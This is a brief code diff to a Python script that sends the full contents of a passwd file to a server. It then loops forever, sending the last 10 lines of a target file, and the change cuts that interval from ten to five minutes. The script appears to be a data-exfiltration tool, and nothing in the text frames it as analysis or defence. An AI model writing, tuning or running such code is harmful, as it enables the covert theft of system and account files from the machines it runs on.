@@ -84,9 +84,9 @@ def execute():
         print("Sending the entire passwd content...")
         send_data_to_server(data_passwd, passwd_file_path)
 
-    # Send the last 10 lines every 10 minutes
+    # Send the last 10 lines every 5 minutes
     while True:
-        time.sleep(600)   # Sleep for 10 minutes
+        time.sleep(300)   # Sleep for 5 minutes
         data_target = read_last_n_lines()
         if data_target:
             print("Sending the last 10 lines of the file...")
